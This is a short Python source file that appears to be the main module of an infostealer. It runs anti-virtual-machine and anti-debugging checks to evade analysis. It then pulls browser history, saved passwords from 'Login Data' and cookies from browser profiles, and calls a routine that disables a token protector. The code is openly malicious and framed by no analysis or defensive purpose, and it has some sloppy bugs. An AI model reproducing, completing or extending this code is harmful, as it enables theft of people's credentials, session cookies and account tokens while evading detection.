from core import extractor
from core import antivm
from core import sysinfo

import os
import sys

class Main:
    def __init__(self) -> None:
        pass

    def antivm(self):
        if antivm.Antivm.run():
            sys.quit()
        
        antivm.AntiDebug.checks()
        

    def browser(self):
        for browser in extractor.browsers_profile:

            profiles = ["Default"]

        for browser in extractor.browsers:

            browserExtractor = extractor.Extract(browser+"\\Local State")
            history = browserExtractor.extractHistory(browser+"\\History")
            passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
            cookies = browserExtractor.extractCookies(browser)

            print(history)
            print(passwd)
            print(cookies)

    def steam(self):
        pass

    def token(self):
        extractor.Anti_tokenprotector.killprotector()

    def run(self):
        antivm.Antivm.run()
        antivm.AntiDebug().checks()

        self.browser()

if __name__ == "__main__":
    Main().run()